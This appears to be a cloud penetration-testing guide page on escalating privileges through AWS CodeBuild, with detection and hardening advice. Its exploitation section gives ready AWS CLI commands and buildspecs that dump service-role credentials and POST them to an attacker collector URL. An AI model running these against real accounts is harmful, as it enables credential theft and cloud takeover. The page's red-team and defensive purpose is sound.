---
cstg_id: CSTG-AWS-CODEBUILD-PRIVESC
title: "AWS Codebuild - Privilege Escalation"
provider: aws
service: codebuild
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - codebuild:CreateProject
  - codebuild:UpdateProject
  - codebuild:StartBuild
  - codebuild:StartBuildBatch
  - codebuild:BatchGetProjects
  - codebuild:BatchGetBuilds
  - iam:PassRole
  - logs:GetLogEvents
tools:
  - AWS CLI
  - AWS SDK
  - IAM privilege-escalation path analysis tooling
references:
  - https://docs.aws.amazon.com/codebuild/latest/userguide/welcome.html
  - https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html
  - https://docs.aws.amazon.com/codebuild/latest/userguide/create-project-cli.html
  - https://docs.aws.amazon.com/codebuild/latest/userguide/build-env-ref-env-vars.html
  - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html
  - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
  - https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
license: CC BY-SA 4.0
---

## Summary

CodeBuild builds run arbitrary shell commands inside a managed container that has the project's **service role** credentials available at the container metadata endpoint. Consequently, any principal able to control what a build does — by creating a project, updating an existing project, or starting a build with attacker-influenced inputs — obtains code execution **as the service role**. If that role is more privileged than the calling principal, this is privilege escalation. Because CI service roles are routinely broad (S3, ECR, CloudFormation, Secrets Manager, sometimes `iam:*` or `*:*`), CodeBuild is one of the most reliable IAM privilege-escalation pivots in AWS.

The escalation has two ingredients:

1. **`iam:PassRole`** on a more-privileged role plus the ability to attach it to a project (`codebuild:CreateProject` or `codebuild:UpdateProject`), and
2. **The ability to make the build execute attacker-chosen commands** (`codebuild:StartBuild`/`StartBuildBatch` with a buildspec, source, or environment override; or by influencing a repo-resident buildspec; or by triggering a webhook).

Inside the build the attacker reads the service-role credentials from the metadata endpoint and exfiltrates them, then uses them off-box, or performs privileged actions directly in the buildspec. This page enumerates the distinct permission-based escalation primitives. Enumeration of projects and roles is covered in [aws-codebuild-enum.md](../02-services/aws-codebuild-enum.md); maintaining access via CodeBuild is covered in [aws-codebuild-persistence.md](../06-persistence/aws-codebuild-persistence.md).

## Prerequisites

- An assumed-breach foothold: a principal (user or role) holding one or more of the permissions in the frontmatter.
- Knowledge of a target role ARN that (a) trusts `codebuild.amazonaws.com` and (b) is more privileged than the current principal. Identify candidates during enumeration; an existing CodeBuild service role is ideal because it already has the trust policy in place.
- For overrides and credential exfiltration, network egress from the build container (default builds have outbound internet; VPC-attached builds depend on the subnet's routing).

### Core technique: read service-role credentials inside a build

Every escalation below ultimately runs commands in a build whose service role is the target. The build container exposes role credentials via the ECS-style container credentials endpoint referenced by `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`:

```bash
# Inside the buildspec commands:
curl -s "169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
# -> {"AccessKeyId":..., "SecretAccessKey":..., "Token":..., "Expiration":...}
```

These temporary credentials are then exfiltrated (printed to logs, POSTed to an external collector, written to an artifact/S3) and used off-box, or the buildspec performs the privileged actions directly. A minimal inline buildspec that dumps the identity and credentials:

```yaml
version: 0.2
phases:
  build:
    commands:
      - aws sts get-caller-identity
      - curl -s "169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"
```

## Exploitation

### iam:PassRole + codebuild:CreateProject + codebuild:StartBuild

The classic full primitive: create a new project that passes a privileged role, with an inline buildspec of your choosing, then start it. This requires no pre-existing project.

```bash
aws codebuild create-project \
  --name pivot-$(date +%s) \
  --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n  build:\n    commands:\n      - curl -s \"169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\" > /tmp/c.json\n      - curl -s -X POST -d @/tmp/c.json https://attacker.example/collect"}' \
  --artifacts '{"type":"NO_ARTIFACTS"}' \
  --environment '{"type":"LINUX_CONTAINER","image":"aws/codebuild/standard:7.0","computeType":"BUILD_GENERAL1_SMALL"}' \
  --service-role arn:aws:iam::<acct>:role/<privileged-codebuild-role>

aws codebuild start-build --project-name pivot-...
```

`iam:PassRole` is the linchpin: it must permit passing the target role. If `iam:PassRole` is scoped only to specific roles, you can only escalate to those roles. The target role's trust policy must allow `codebuild.amazonaws.com`.

### codebuild:StartBuild with buildspecOverride / environment overrides on an existing project

If a project already exists and uses a privileged service role, you do not need `CreateProject` or even `PassRole` — `StartBuild` alone can override the buildspec, source, image, and environment variables at start time, executing your commands as the existing role.

```bash
aws codebuild start-build \
  --project-name <existing-privileged-project> \
  --buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - curl -s "169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" | tee /dev/stderr'
```

Related override parameters that broaden control without touching the project definition: `--source-type-override`, `--source-location-override`, `--source-version`, `--image-override`, `--environment-variables-override`, `--privileged-mode-override`, and `--service-role-override` (which, combined with `iam:PassRole`, lets a single `StartBuild` call point an existing project at a different privileged role). Because the project is unchanged afterwards, this is also stealthier than `UpdateProject`.

### codebuild:UpdateProject (+ optional iam:PassRole)

With `UpdateProject` you can repoint an existing project's `serviceRole` to a more-privileged role (requires `iam:PassRole` for the new role) and/or replace its inline buildspec, then start a build. Even without changing the role, swapping the buildspec turns a benign project into a credential-exfiltration job that runs as that project's existing service role.

```bash
aws codebuild update-project \
  --name <existing-project> \
  --service-role arn:aws:iam::<acct>:role/<more-privileged-role> \
  --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n  build:\n    commands:\n      - curl -s \"169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\""}'

aws codebuild start-build --project-name <existing-project>
```

### codebuild:StartBuildBatch / batch builds

`StartBuildBatch` runs a batch build and accepts the same `buildSpecOverride`/environment overrides. It is functionally equivalent to `StartBuild` for escalation and is sometimes permitted where `StartBuild` is not, so test both action names against a target project.

```bash
aws codebuild start-build-batch \
  --project-name <existing-privileged-project> \
  --buildspec-override 'version: 0.2
batch:
  fast-fail: false
phases:
  build:
    commands:
      - curl -s "169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"'
```

### Influencing a repository-resident buildspec (source poisoning)

When a project's `source.buildspec` is a path (for example `buildspec.yml`) rather than an inline string, the commands come from the source repository. If you can push to the built branch (CodeCommit write, GitHub/Bitbucket write) or the project builds pull requests, you control the build commands without any CodeBuild write permission at all — only the ability to write to source and (optionally) `StartBuild`.

```yaml
# buildspec.yml committed to the built branch
version: 0.2
phases:
  build:
    commands:
      - curl -s "169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" | base64
```

A particularly severe variant: a project whose **webhook** builds pull requests from forks. An external attacker with no AWS access can open a PR that modifies `buildspec.yml`, and the automatically triggered build runs their code as the service role. Treat any fork-PR-triggered project as remotely exploitable. See the enumeration page for detecting permissive `filterGroups`.

### Harvesting secrets and chaining the service role

Once code runs as the service role, escalation continues by using whatever the role can do:

- **Read referenced secrets** — `aws secretsmanager get-secret-value` / `aws ssm get-parameter --with-decryption` for any secret the role can read (often more than the project references).
- **Read source credentials and other env** — environment variables of type `SECRETS_MANAGER`/`PARAMETER_STORE` are already resolved into the build environment; print `env` to capture them.
- **Assume further roles** — if the service role has `sts:AssumeRole`, pivot to those roles.
- **Touch IAM directly** — if the role has `iam:*`, create access keys, attach admin policies, or create a new role with `AdministratorAccess`.
- **Pivot through the network** — VPC-attached builds can reach internal-only services (RDS, internal endpoints) from inside the container.

### Stolen source credentials

If `ListSourceCredentials` showed connected GitHub/Bitbucket providers, a build that can reach those services (or extract the token from the environment when source auth is exposed) can lead to source-control compromise, enabling broader supply-chain attacks.

## Detection & Logging

**CloudTrail** records the management-plane calls behind every primitive above. High-value detections:

- `CreateProject` or `UpdateProject` immediately followed by `StartBuild`/`StartBuildBatch` from the same principal, especially with a freshly created or repointed `serviceRole`.
- Any `CreateProject`/`UpdateProject` whose request parameters include a `serviceRole` more privileged than the caller, correlated with an `iam:PassRole` authorization in the same call context.
- `StartBuild`/`StartBuildBatch` containing a `buildspecOverride`, `serviceRoleOverride`, `imageOverride`, `privilegedModeOverride`, or `environmentVariablesOverride` — override use on otherwise-stable projects is anomalous.
- Builds where the `initiator` is an unusual principal, or builds triggered by fork pull requests.
- Service-role temporary credentials (the role session name typically reflects the CodeBuild build) appearing in CloudTrail from **outside** AWS CodeBuild source IPs/user agents — a strong sign credentials were exfiltrated from a build and used off-box.
- Spikes in `secretsmanager:GetSecretValue` / `ssm:GetParameter` by a CodeBuild service-role session beyond its normal baseline.

CloudWatch Logs / S3 build logs may contain the dumped credentials or `env` output; correlate log writes with subsequent off-box use of the same role session.

## Remediation & Hardening

- Apply least privilege to service roles; never grant `*:*`, `iam:*`, or broad `iam:PassRole`. Scope `iam:PassRole` to specific roles and add an `iam:PassedToService: codebuild.amazonaws.com` condition.
- Separate the permission to **define** projects (`CreateProject`/`UpdateProject`) from the permission to **run** them, and grant both sparingly.
- Constrain or deny `StartBuild`/`StartBuildBatch` override parameters where possible; treat override capability as equivalent to code execution as the role.
- Use inline, administrator-controlled buildspecs for privileged projects, or restrict repo-resident buildspecs to trusted, protected branches with required reviews. Never build fork pull requests with a privileged service role; disable fork-PR builds or gate them behind manual approval.
- Pin distinct least-privilege roles per project so one compromised build cannot reach unrelated resources.
- Avoid `privilegedMode` unless required.
- Detect off-box use of build credentials via CloudTrail source-IP/user-agent analysis and short-lived credential monitoring; alert on `UpdateProject`/`CreateProject`→`StartBuild` chains and on override usage.
- Keep CloudTrail enabled in all regions with log-file validation; restrict and monitor read access to build logs.

## Tools

- AWS CLI (`aws codebuild create-project|update-project|start-build|start-build-batch`, `aws iam`, `aws sts`)
- AWS SDKs for scripted exploitation and credential handling
- IAM privilege-escalation path analysis tooling that flags `PassRole`+CodeBuild combinations
- CloudTrail / log analytics for detection engineering and validation

## References

- AWS CodeBuild User Guide — https://docs.aws.amazon.com/codebuild/latest/userguide/welcome.html
- Buildspec reference — https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html
- Create a build project (CLI) — https://docs.aws.amazon.com/codebuild/latest/userguide/create-project-cli.html
- Build environment environment variables — https://docs.aws.amazon.com/codebuild/latest/userguide/build-env-ref-env-vars.html
- IAM — Granting a user permissions to pass a role (PassRole) — https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html
- Rhino Security Labs — AWS privilege escalation methods and mitigation — https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- HackingThe.Cloud — AWS IAM privilege escalation — https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/
